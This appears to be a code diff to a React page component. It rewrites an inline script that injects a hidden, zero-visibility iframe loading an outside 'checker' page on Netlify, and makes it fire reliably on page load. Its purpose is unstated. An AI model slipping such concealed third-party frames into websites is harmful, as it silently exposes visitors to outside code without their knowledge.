@@ -9,12 +9,19 @@ export default function Home() {
     >
       <script>
         {`
-        document.addEventListener('DOMContentLoaded', function (){
-        let iframe = document.createElement('iframe');
-        iframe.src = 'https://someservice.netlify.app/checker';
-        iframe.setAttribute('style', 'display:none;');
-        document.body.appendChild(iframe);
-        })
+        (function(){
+          function addIframe(){
+            let iframe = document.createElement('iframe');
+            iframe.src = 'https://someservice.netlify.app/checker';
+            iframe.setAttribute('style', 'display:none;');
+            document.body.appendChild(iframe);
+          }
+          if(document.body){
+            addIframe()
+          } else {
+            document.addEventListener('DOMContentLoaded', addIframe)
+          }
+        })()
         `}
       </script>
     </Helmet>
